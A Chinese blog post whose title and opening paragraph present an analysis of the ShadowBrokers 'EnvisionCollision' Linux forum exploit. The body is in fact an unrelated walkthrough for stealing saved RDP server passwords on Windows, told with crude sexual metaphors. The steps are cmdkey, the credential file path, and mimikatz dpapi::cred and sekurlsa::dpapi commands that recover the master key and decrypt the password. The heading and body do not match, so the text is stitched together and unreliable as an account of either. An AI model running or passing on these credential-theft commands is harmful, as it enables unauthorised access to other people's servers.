---
layout: post
title: 对ShadowBrokers Envison Collision漏洞的利用分析
subtitle: 2017/11/08
date: 2017-11-08
author: FR
header-img:
catalog: true
tags:
    - ShadowBrokers
    - 漏洞
---
- **转自FreeBuf [【FreeBuf链接】](http://www.freebuf.com/vuls/152427.html)**  
- **原文来自steemit[【原文链接】](https://steemit.com/security/@shadoweye/analysis-of-the-shadowbrokers-envisoncollision-exploit)**

目前我们正在对ShadowBrokers公开的利用工具以及脚本等进行了全方位的分析和分类工作，所以写一篇关于Linux下“envisioncollision”漏洞利用的简单介绍是非常值得的。我们之前已经对所公开文件中的[PHPBB](https://steemit.com/security/@shadoweye/analysis-of-the-shadowbrokers-xpphpbb-pl-exploit)漏洞进行披露，当时的文章中提到这个漏洞非常受网络犯罪组织的欢迎，因为很多web论坛都存在“有效”的SIGINT目标，所以接下来披露另一个web论坛漏洞合情合理。

道友们应该碰到过管理在本地保存远程终端的凭据，凭据里躺着诱人的胴体(服务器密码)，早已让我们的大棒饥渴难耐了。
但是，胴体却裹了一身道袍(加密)，待老衲操起法器将其宽衣解带。

![img/2017-10-20/pjyczdpjhqfwqmm_01.png](https://www.t00ls.net/attachments/month_1710/1710010133df4eed0bc854ab65.png)

## 0x01 凭据管理器中查看Windows凭据：TERMSRV/1xx.xxx.xxx.xx2

![img/2017-10-20/pjyczdpjhqfwqmm_02.png](https://www.t00ls.net/attachments/month_1710/1710010133cc76caaa81644803.png)

可通过命令行获取，执行: cmdkey /list
>注意:该命令务必在Session会话下执行，system下执行无结果。

## 0x02 凭据存储在用户目录下

C:\Users\<username>\AppData\Local\Microsoft\Credentials\*，图中名为"FF359429D6F19C64BA7D3E282558EEB5"的文件即为目标凭据:TERMSRV/1xx.xxx.xxx.xx2的存储文件

![img/2017-10-20/pjyczdpjhqfwqmm_03.png](https://www.t00ls.net/attachments/month_1710/1710010133de85b4d2e02de9b4.png)

## 0x03 执行

`mimikatz "dpapi::cred /in:C:\Users\xx\AppData\Local\Microsoft\Credentials\FF359429D6F19C64BA7D3E282558EEB5"`

![img/2017-10-20/pjyczdpjhqfwqmm_04.png](https://www.t00ls.net/attachments/month_1710/1710010133f73326447a780849.png)

pbData是凭据的加密数据，guidMasterKey是凭据的GUID: {d91b091a-ef25-4424-aa45-a2a56b47a699}。

## 0x04 执行

`mimikatz privilege::debug sekurlsa::dpapi`

![img/2017-10-20/pjyczdpjhqfwqmm_05.png](https://www.t00ls.net/attachments/month_1710/17100101335e46e0e11d5639b9.png)

根据目标凭据GUID: {d91b091a-ef25-4424-aa45-a2a56b47a699}找到其关联的MasterKey，这个MasterKey就是加密凭据的密钥，即解密pbData所必须的东西。

## 0x05 拿到了MasterKey,服务器密码便唾手可得。执行解密命令

`mimikatz "dpapi::cred /in:C:\Users\xx\AppData\Local\Microsoft\Credentials\FF359429D6F19C64BA7D3E282558EEB5 /masterkey:28d1f3252c019f9cxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx16dcec8e5dbf5cd0"`

![img/2017-10-20/pjyczdpjhqfwqmm_06.png](https://www.t00ls.net/attachments/month_1710/1710010133a0bde34b6ad38f6f.png)

解密出来的CredentialBlob即为凭据TERMSRV/1xx.xxx.xxx.xx2的服务器密码。

衣带渐宽终不悔，为伊消得人憔悴。阿弥陀佛。

## 参考:
http://www.freebuf.com/articles/network/146460.html
